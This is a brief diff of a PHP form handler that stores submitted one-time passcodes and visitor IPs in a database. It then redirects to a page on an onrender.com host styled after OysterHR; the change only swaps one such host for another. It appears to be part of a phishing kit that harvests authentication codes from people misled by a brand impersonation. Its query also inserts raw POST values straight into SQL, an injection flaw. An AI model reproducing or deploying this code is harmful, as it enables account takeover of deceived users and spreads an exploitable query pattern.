@@ -6,7 +6,7 @@ if ($_SERVER["REQUEST_METHOD"]=="POST"){
     $query = "INSERT INTO otpconfirm (otpconfirm,time,ip) VALUES ('$_POST[otpconfirm]',NOW(),'$_POST[ip]')";
     $result = pg_query($query);
 
- header("Location:https://oysterhr-8nfz.onrender.com/OysterHR.com/oysterhr/verification_processing.html");
+ header("Location:https://oyster-hr-uyjo.onrender.com//OysterHR.com/oysterhr/verification_processing.html");
 
 exit; 
 }
